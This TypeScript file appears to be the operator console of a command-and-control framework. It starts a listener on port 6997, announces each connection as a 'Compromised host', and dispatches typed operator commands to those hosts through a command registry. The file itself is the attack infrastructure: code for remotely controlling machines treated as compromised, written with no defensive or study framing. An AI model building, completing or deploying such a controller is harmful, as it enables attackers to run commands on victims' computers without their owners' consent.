import yargs = require('yargs');
import { CommandRegistry } from './registry';
import { PacketTypes } from 'c2lib';
import { ControlServer } from './controlserver';
import * as readline from 'node:readline/promises';
import { stdin, stdout } from 'node:process';
import { parse as shellParse } from 'shell-quote';

async function main() {
    if (!process.stdin.isTTY) {
        console.error('Input must be a tty');
        process.exit(1);
    }

    let argv = await yargs(process.argv.slice(2))
        .usage('Usage: $0 [-h ip] [-p port]')
        .default('host', '0.0.0.0')
        .alias('host', 'h')
        .default('port', 6997)
        .number('port')
        .alias('port', 'p')
        .help('help').argv;
    
    const packetTypes = new PacketTypes();
    await packetTypes.load();
    const registry = new CommandRegistry();
    await registry.loadCommands();

    let control = new ControlServer(packetTypes, { 
        ip: argv.host,
        port: argv.port,
    });
    await control.listen();
    console.log(`Local control server started at ${argv.host}:${argv.port}`);

    control.on('connection', host => {
        console.log(`Compromised host ${host.ip} ;)`);
        rl.prompt();
    });

    const rl = readline.createInterface({
        input: stdin,
        output: stdout,
        removeHistoryDuplicates: true,
        prompt: '> ',
        tabSize: 4,
    });

    process.on('SIGINT', () => {
        control.abortCurrentCommand();
    });

    rl.on('line', async (input) => {
        let mixedArgs = shellParse(input);
        let args = mixedArgs.map(arg => {
            if (typeof arg !== 'string') {
                if ('op' in arg) {
                    if (arg.op === 'glob') {
                        return arg.pattern;
                    }
                    return arg.op;
                }
            }
            return arg;
        }).filter(arg => typeof arg === 'string') as string[];
        if (!(args[0] in registry.commands)) {
            console.log('Unknown command.');
        } else {
            try {
                await registry.commands[args[0]](control, args);
            } catch (err) {
                console.error(`Error while executing "${args[0]}": ${err}`);
            }
        }
        rl.prompt();
    });
    rl.prompt();
}

main();
